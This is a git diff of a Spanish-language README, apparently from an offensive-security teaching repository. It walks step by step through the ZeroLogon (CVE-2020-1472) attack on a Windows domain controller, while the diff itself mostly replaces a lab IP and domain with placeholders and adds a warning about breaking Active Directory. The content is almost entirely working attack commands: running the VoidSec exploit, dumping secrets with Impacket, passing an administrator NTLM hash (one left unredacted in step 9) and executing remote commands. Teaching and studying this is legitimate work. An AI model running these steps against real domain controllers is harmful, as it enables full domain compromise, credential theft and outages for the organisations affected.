@@ -1,4 +1,4 @@
-# Ataque ZeroLogon (CVE-2020-1472) usando NetExec (nxc) + VoidSec + Impacket
+# 📌 Ataque ZeroLogon (CVE-2020-1472)
 
 Este repositorio documenta paso a paso cómo ejecutar el ataque **ZeroLogon** utilizando `NetExec` (antes CrackMapExec), el exploit de [VoidSec](https://github.com/VoidSec/CVE-2020-1472) y herramientas de Impacket.
 
@@ -10,7 +10,7 @@ Este repositorio documenta paso a paso cómo ejecutar el ataque **ZeroLogon** ut
 
 ---
 
-## Requisitos
+## ⚙️ Requisitos
 
 - Controlador de dominio sin parches para CVE-2020-1472.
 - Máquina atacante con:
@@ -20,18 +20,18 @@ Este repositorio documenta paso a paso cómo ejecutar el ataque **ZeroLogon** ut
 
 ---
 
-## Paso a paso del ataque
+## 🧭 Paso a paso del ataque
 
 ### 1. Verificar conectividad SMB con el DC
 
 ```bash
-nxc smb 10.0.0.10
+nxc smb [IP_DEL_SERVER_AD]
 ```
 
 Repetir si es necesario para confirmar acceso:
 
 ```bash
-nxc smb 10.0.0.10
+nxc smb [IP_DEL_SERVER_AD]
 ```
 
 ---
@@ -39,7 +39,7 @@ nxc smb 10.0.0.10
 ### 2. Explotar ZeroLogon con NetExec
 
 ```bash
-nxc smb 10.0.0.10 -u '' -p '' -M zerologon
+nxc smb [IP_DEL_SERVER_AD] -u '' -p '' -M zerologon
 ```
 
 Este módulo intenta autenticar usando claves nulas y explotar la vulnerabilidad en Netlogon.
@@ -64,7 +64,7 @@ python3 cve-2020-1472-exploit.py
 O usar argumentos manuales:
 
 ```bash
-python3 cve-2020-1472-exploit.py -t 10.0.0.10 -n DC01
+python3 cve-2020-1472-exploit.py -t [IP_DEL_SERVER_AD] -n [NOMBRE_DEL_SERVER_AD]
 ```
 
 ---
@@ -72,7 +72,7 @@ python3 cve-2020-1472-exploit.py -t 10.0.0.10 -n DC01
 ### 5. Volcar hashes con Impacket
 
 ```bash
-impacket-secretsdump 'LAHERMANADEFRAN/DC01$@10.0.0.10'
+impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_SERVER_AD]$@[IP_DEL_SERVER_AD]'
 ```
 
 Esto permite obtener los secretos de LSA y hash de administrador.
@@ -82,13 +82,13 @@ Esto permite obtener los secretos de LSA y hash de administrador.
 ### 6. Validar acceso como máquina y luego como administrador
 
 ```bash
-nxc smb 10.0.0.10 -u 'DC01$' -p '' --lsa
+nxc smb [IP_DEL_SERVER_AD] -u '[NOMBRE_DEL_SERVER_AD]$' -p '' --lsa
 ```
 
 Con hash de administrador (por ejemplo):
 
 ```bash
-nxc smb 10.0.0.10 -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' --lsa
+nxc smb [IP_DEL_SERVER_AD] -u '[USUARIO_ADMINISTRADOR]' -H '[HASH_DE_ADMINISTRADOR]' --lsa
 ```
 
 ---
@@ -102,7 +102,7 @@ python3 reinstall_original_pw.py
 O con argumentos:
 
 ```bash
-python3 reinstall_original_pw.py DC01$ 10.0.0.10 <HASH_LARGO>
+python3 reinstall_original_pw.py [NOMBRE_DEL_SERVER_AD]$ [IP_DEL_SERVER_AD] [HASH_LARGO]
 ```
 
 ---
@@ -110,7 +110,7 @@ python3 reinstall_original_pw.py DC01$ 10.0.0.10 <HASH_LARGO>
 ### 8. Validar acceso final con hash NTLM
 
 ```bash
-impacket-secretsdump 'LAHERMANADEFRAN/DC01$@10.0.0.10'
+impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_SERVER_AD]$@[IP_DEL_SERVER_AD]'
 ```
 
 ---
@@ -118,12 +118,12 @@ impacket-secretsdump 'LAHERMANADEFRAN/DC01$@10.0.0.10'
 ### 9. Ejecutar comando remoto como administrador
 
 ```bash
-nxc smb 10.0.0.10 -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' -x whoami
+nxc smb [IP_DEL_SERVER_AD] -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' -x whoami
 ```
 
 ---
 
-## ¿Qué hicimos?
+## 🧪 ¿Qué hicimos?
 
 - Usamos `nxc` para aprovechar la vulnerabilidad en Netlogon.
 - Reemplazamos la contraseña de la cuenta del DC con una contraseña nula.
@@ -133,15 +133,32 @@ nxc smb 10.0.0.10 -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' -x wh
 
 ---
 
-## Referencias
+## 📚 Referencias
 
 - [ZeroLogon CVE-2020-1472 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)
 - [VoidSec CVE-2020-1472 Exploit](https://github.com/VoidSec/CVE-2020-1472)
 - [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec)
 - [Impacket](https://github.com/SecureAuthCorp/impacket)
 
+------
+
+## 🚨 Advertencia
+
+### Riesgo crítico: el AD puede romperse
+El exploit ZeroLogon cambia la contraseña de la cuenta de máquina del controlador de dominio (DC01$). Si no se restaura rápidamente, el controlador ya no podrá autenticarse ni replicarse con otros DCs.
+
+Esto puede:
+
+Romper la replicación del Active Directory.
+
+Causar fallos en políticas, usuarios y servicios.
+
+Obligar a restaurar el dominio desde backups.
+
+### 🛑 Siempre restaurá la contraseña original del DC antes de que se sincronice con otros controladores.
+
 ---
 
-## Autor
+## 👤 Autor
 
-Explicación elaborada por [Tu Nombre] para propósitos didácticos y de investigación en ciberseguridad ofensiva.
+Explicación elaborada por [Sebastian Peinador](https://www.linkedin.com/in/sebastian-j-peinador/) para propósitos didácticos y de investigación en ciberseguridad ofensiva.
